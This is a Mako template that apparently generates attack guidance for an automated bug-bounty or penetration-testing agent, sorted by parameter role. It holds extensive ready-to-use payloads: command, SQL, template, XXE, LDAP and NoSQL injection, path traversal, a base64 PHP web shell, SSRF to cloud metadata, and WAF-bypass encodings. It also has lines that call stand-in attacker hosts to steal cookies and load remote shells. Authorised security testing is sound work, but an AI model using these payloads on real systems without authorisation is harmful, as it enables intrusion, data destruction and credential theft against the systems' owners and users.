## Parameter Role-Based Testing Guidance

% if not parameter_roles:
No parameter roles identified yet. During reconnaissance, classify parameters by their function.
% else:

### Parameter Role Classification

Parameters have been classified by their functional role. Each role has specific attack patterns and testing priorities.

---

### IDENTITY Parameters (Access Control Testing)

% if 'IDENTITY' in parameter_roles:
<%
identity_params = parameter_roles['IDENTITY']
%>

**Count**: ${len(identity_params)} parameters control object access

**Identified Parameters**:
% for param in identity_params[:15]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Sample: ${', '.join(map(str, param.sample_values[:3]))} ${f'(pattern: {param.pattern})' if param.pattern else ''}
  * Predictable: ${'YES - Easy enumeration' if param.predictable else 'NO - Requires guessing'}
% endfor
% if len(identity_params) > 15:
... and ${len(identity_params) - 15} more

% endif

**Testing Priority**: **CRITICAL** (90% of bug bounties involve broken access control)

**Attack Patterns**:

1. **Horizontal Privilege Escalation**
   ```
   # Original: /api/user/123/profile
   # Test: /api/user/124/profile (other user)
   # Test: /api/user/124/profile?user_id=125 (parameter pollution)
   ```

2. **Vertical Privilege Escalation**
   ```
   # Test admin/privileged IDs
   /api/user/1/profile  (often admin)
   /api/user/0/profile
   /api/user/-1/profile
   ```

3. **UUID/Hash Enumeration**
   ```
   # If UUID: Try version 1 (timestamp-based, predictable)
   # If hash: Check for MD5/SHA1 of sequential IDs
   # Try null UUID: 00000000-0000-0000-0000-000000000000
   ```

4. **Array/Batch Access**
   ```
   ?id[]=123&id[]=124&id[]=125
   ?id=123,124,125
   ?ids=123&ids=124
   ```

5. **Wildcard/Special Values**
   ```
   ?id=*
   ?id=..
   ?id=all
   ?id=null
   ```

**Recommended Tools**: `idor_scanner`, `auth_analyzer`, `http_request`

**Success Indicators**:
- Different user data returned (check email, username, phone)
- Access to admin-only fields
- 200 OK when should be 403 Forbidden
- Leaked sensitive information

% else:
**No IDENTITY parameters identified yet.**

Look for: `id`, `user_id`, `account_id`, `profile_id`, `order_id`, `document_id`, `file_id`, `message_id`, etc.
% endif

---

### COMMAND Parameters (Injection Testing)

% if 'COMMAND' in parameter_roles:
<%
command_params = parameter_roles['COMMAND']
%>

**Count**: ${len(command_params)} parameters execute operations

**Identified Parameters**:
% for param in command_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Likely executes: ${param.inferred_operation or 'Unknown operation'}
% endfor

**Testing Priority**: **CRITICAL** (RCE potential)

**Attack Patterns**:

1. **OS Command Injection**
   ```
   # Test basic injection
   param=test; whoami
   param=test`whoami`
   param=test$(whoami)
   param=test|whoami
   param=test&whoami
   param=test\nwhoami
   ```

2. **SQL Injection** (if database operations)
   ```
   param=' OR '1'='1
   param=1' UNION SELECT null--
   param=1' AND SLEEP(5)--
   param=1'; DROP TABLE users--
   ```

3. **Template Injection** (if rendering)
   ```
   param={{7*7}}
   param=${{7*7}}
   param=<%= 7*7 %>
   param={7*7}
   ```

4. **XXE Injection** (if XML processing)
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>
   ```

5. **Code Injection** (if eval/exec)
   ```
   param=__import__('os').system('whoami')
   param=eval('7*7')
   param=system('cat /etc/passwd')
   ```

**Recommended Tools**: `shell`, `nuclei`, `sqlmap`, `think` (for payload generation)

**Success Indicators**:
- Command output in response
- Time delays (blind injection)
- DNS/HTTP callbacks (out-of-band)
- Error messages revealing backend

% else:
**No COMMAND parameters identified yet.**

Look for: `cmd`, `exec`, `command`, `query`, `search`, `action`, `method`, `operation`, `function`
% endif

---

### TEMPLATE Parameters (SSTI/XSS Testing)

% if 'TEMPLATE' in parameter_roles:
<%
template_params = parameter_roles['TEMPLATE']
%>

**Count**: ${len(template_params)} parameters used in rendering

**Identified Parameters**:
% for param in template_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Reflected in: ${param.reflection_context or 'Unknown context'}
% endfor

**Testing Priority**: **HIGH** (SSTI = RCE, XSS = Account takeover)

**Attack Patterns**:

1. **Server-Side Template Injection**
   ```
   # Jinja2 (Python/Flask)
   {{7*7}}
   {{config.items()}}
   {{''.__class__.__mro__[1].__subclasses__()}}

   # Twig (PHP)
   {{7*7}}
   {{_self.env.registerUndefinedFilterCallback("exec")}}

   # Freemarker (Java)
   ${{7*7}}
   <#assign ex="freemarker.template.utility.Execute"?new()>
   ```

2. **Cross-Site Scripting (XSS)**
   ```
   # Reflected XSS
   <script>alert(document.domain)</script>
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>

   # Stored XSS
   "><script>fetch('//attacker.com?c='+document.cookie)</script>

   # DOM XSS
   javascript:alert(1)
   data:text/html,<script>alert(1)</script>
   ```

3. **HTML Injection**
   ```
   <h1>Injected HTML</h1>
   <iframe src="//evil.com">
   ```

4. **Polyglot Payloads** (multiple contexts)
   ```
   '"><img src=x onerror=alert(1)>
   {{7*7}}<script>alert(1)</script>
   ```

**Recommended Tools**: `http_request`, `browser`, `payload_mutator` (for WAF bypass)

**Success Indicators**:
- Template expression evaluated (7*7 = 49)
- JavaScript executed in browser
- HTML rendered without escaping
- Error messages revealing template engine

% else:
**No TEMPLATE parameters identified yet.**

Look for parameters reflected in HTML/JSON responses: `name`, `message`, `comment`, `title`, `description`, `content`
% endif

---

### FILTER Parameters (SQL/NoSQL Injection)

% if 'FILTER' in parameter_roles:
<%
filter_params = parameter_roles['FILTER']
%>

**Count**: ${len(filter_params)} parameters filter/query data

**Identified Parameters**:
% for param in filter_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Filters: ${param.filtered_field or 'Unknown field'}
% endfor

**Testing Priority**: **HIGH** (Data extraction via injection)

**Attack Patterns**:

1. **SQL Injection (Boolean-Based)**
   ```
   param=test' AND '1'='1
   param=test' AND '1'='2
   param=1 AND 1=1
   param=1 AND 1=2
   ```

2. **SQL Injection (Time-Based)**
   ```
   param=1' AND SLEEP(5)--
   param=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
   param=1'; WAITFOR DELAY '00:00:05'--
   ```

3. **NoSQL Injection**
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
   {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
   {"username": {"$gt": ""}, "password": {"$gt": ""}}
   ```

4. **LDAP Injection**
   ```
   param=*
   param=*)(uid=*))(|(uid=*
   param=admin)(|(password=*))
   ```

5. **XML Injection**
   ```
   param=<foo>bar</foo>
   param='<foo>bar</foo>
   ```

**Recommended Tools**: `sqlmap`, `nuclei`, `validation_engine` (multi-stage confirmation)

**Success Indicators**:
- Different results for true/false conditions
- Time delays matching payload
- Error messages revealing query structure
- Unauthorized data access

% else:
**No FILTER parameters identified yet.**

Look for: `filter`, `where`, `query`, `search`, `sort`, `order_by`, `category`, `status`, `type`
% endif

---

### NAVIGATION Parameters (Path Traversal)

% if 'NAVIGATION' in parameter_roles:
<%
nav_params = parameter_roles['NAVIGATION']
%>

**Count**: ${len(nav_params)} parameters control file/page access

**Identified Parameters**:
% for param in nav_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Accesses: ${param.resource_type or 'Unknown resource'}
% endfor

**Testing Priority**: **HIGH** (Arbitrary file read/LFI/RFI)

**Attack Patterns**:

1. **Path Traversal (Linux)**
   ```
   param=../../../../etc/passwd
   param=..%2F..%2F..%2F..%2Fetc%2Fpasswd
   param=....//....//....//etc/passwd
   param=/etc/passwd
   param=file:///etc/passwd
   ```

2. **Path Traversal (Windows)**
   ```
   param=..\..\..\..\windows\win.ini
   param=..%5C..%5C..%5Cwindows%5Cwin.ini
   param=C:\windows\win.ini
   param=file:///C:/windows/win.ini
   ```

3. **Local File Inclusion (LFI)**
   ```
   param=php://filter/convert.base64-encode/resource=index.php
   param=php://input (with POST data)
   param=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
   param=/var/log/apache2/access.log (log poisoning)
   ```

4. **Remote File Inclusion (RFI)**
   ```
   param=http://attacker.com/shell.txt
   param=//attacker.com/shell.txt
   param=ftp://attacker.com/shell.txt
   ```

5. **Null Byte Injection** (PHP < 5.3)
   ```
   param=../../../../etc/passwd%00
   param=shell.txt%00.php
   ```

**Recommended Tools**: `http_request`, `nuclei`, `endpoint_discovery` (find more file params)

**Success Indicators**:
- File contents returned (passwd, win.ini, config files)
- Different behavior for valid/invalid paths
- Error messages revealing file system structure
- Code disclosure (PHP source, configs)

% else:
**No NAVIGATION parameters identified yet.**

Look for: `file`, `path`, `page`, `template`, `document`, `include`, `load`, `view`, `download`
% endif

---

### REDIRECT Parameters (Open Redirect/SSRF)

% if 'REDIRECT' in parameter_roles:
<%
redirect_params = parameter_roles['REDIRECT']
%>

**Count**: ${len(redirect_params)} parameters control redirects/requests

**Identified Parameters**:
% for param in redirect_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Type: ${param.redirect_type or 'Unknown'}
% endfor

**Testing Priority**: **MEDIUM-HIGH** (Open redirect → Phishing, SSRF → Internal access)

**Attack Patterns**:

1. **Open Redirect**
   ```
   param=https://evil.com
   param=//evil.com
   param=\evil.com
   param=javascript:alert(1)
   param=data:text/html,<script>alert(1)</script>
   ```

2. **Server-Side Request Forgery (SSRF)**
   ```
   # Internal network
   param=http://127.0.0.1
   param=http://localhost
   param=http://169.254.169.254 (AWS metadata)
   param=http://192.168.1.1

   # Protocol smuggling
   param=file:///etc/passwd
   param=gopher://localhost:6379/_... (Redis)
   param=dict://localhost:11211/... (Memcached)
   ```

3. **DNS Rebinding**
   ```
   param=http://attacker-rebind.com
   (DNS switches from public IP to 127.0.0.1)
   ```

4. **URL Parser Confusion**
   ```
   param=https://trusted.com@evil.com
   param=https://trusted.com%00@evil.com
   param=https://evil.com#@trusted.com
   ```

**Recommended Tools**: `ssrf_detector`, `http_request`, `shodan` (find internal services)

**Success Indicators**:
- Redirect to external domain
- Response from internal service
- DNS lookup to attacker domain (blind SSRF)
- HTTP request to attacker server
- Cloud metadata access (AWS, GCP, Azure)

% else:
**No REDIRECT parameters identified yet.**

Look for: `url`, `redirect`, `next`, `return`, `callback`, `link`, `goto`, `target`, `destination`
% endif

---

### CONFIGURATION Parameters (Mass Assignment/Logic Flaws)

% if 'CONFIGURATION' in parameter_roles:
<%
config_params = parameter_roles['CONFIGURATION']
%>

**Count**: ${len(config_params)} parameters configure behavior

**Identified Parameters**:
% for param in config_params[:10]:
- `${param.name}` in `${param.endpoint}` (${param.location})
  * Controls: ${param.controls or 'Unknown setting'}
% endfor

**Testing Priority**: **MEDIUM** (Privilege escalation, business logic bypass)

**Attack Patterns**:

1. **Mass Assignment**
   ```json
   # Add admin field
   {"username": "attacker", "email": "a@b.c", "is_admin": true}
   {"username": "attacker", "role": "admin"}
   {"username": "attacker", "privileges": ["admin"]}
   ```

2. **Parameter Pollution**
   ```
   ?price=1000&price=1
   ?discount=10&discount=100
   ?role=user&role=admin
   ```

3. **Business Logic Bypass**
   ```
   # Negative quantities
   ?quantity=-1
   # Zero price
   ?price=0
   # Extreme values
   ?limit=999999999
   ```

4. **Hidden Parameter Discovery**
   ```
   # Try common admin params
   ?debug=true
   ?admin=1
   ?test=1
   ?dev=true
   ```

**Recommended Tools**: `parameter_miner`, `business_logic_tester`, `api_flow_engine`

**Success Indicators**:
- Privilege escalation to admin
- Price manipulation accepted
- Business rules bypassed
- Hidden functionality exposed

% else:
**No CONFIGURATION parameters identified yet.**

Look for: `role`, `admin`, `is_admin`, `privileges`, `permissions`, `settings`, `config`, `options`
% endif

---

### Cross-Parameter Attack Patterns

% if parameter_correlations:

**Parameter Relationships Detected**:

% for corr in parameter_correlations[:8]:
- `${corr.param1}` ↔ `${corr.param2}`: ${corr.relationship}
  * **Attack**: ${corr.attack_suggestion}
% endfor

**Testing Strategy**:
1. Test parameters in isolation first
2. Then test correlated parameters together
3. Try conflicting values for related params
4. Test parameter precedence (which wins?)

% endif

---

## General Testing Guidance

### Encoding/Obfuscation Techniques

When WAF blocks payloads, try:

```
# URL encoding
%2e%2e%2f → ../
%3cscript%3e → <script>

# Double encoding
%252e%252e%252f → ../ (after decode)

# Unicode
\u002e\u002e\u002f → ../
\xc0\xaf → / (overlong UTF-8)

# Case variation
<ScRiPt> (bypass case-sensitive filters)

# Null bytes
%00 (PHP < 5.3)

# Comments
/**/SELECT/**/  (SQL)
//\n (JavaScript)
```

### Payload Mutation Strategy

Use `payload_mutator` tool with evolution settings:
1. Start with basic payload
2. If blocked, mutate (encoding, case, comments)
3. Track what works
4. Evolve successful mutations

### Multi-Stage Validation

For each potential finding:
1. **Confirm** with multiple test cases
2. **Validate** with different payloads
3. **Verify** impact (not just reflection)
4. Use `validation_engine` for systematic confirmation

---

**Remember**: Parameter roles guide attack prioritization. Focus on:
1. IDENTITY params (IDOR) - highest ROI
2. COMMAND params (RCE) - highest severity
3. TEMPLATE params (SSTI/XSS) - common and impactful
4. Other roles based on target profile

% endif
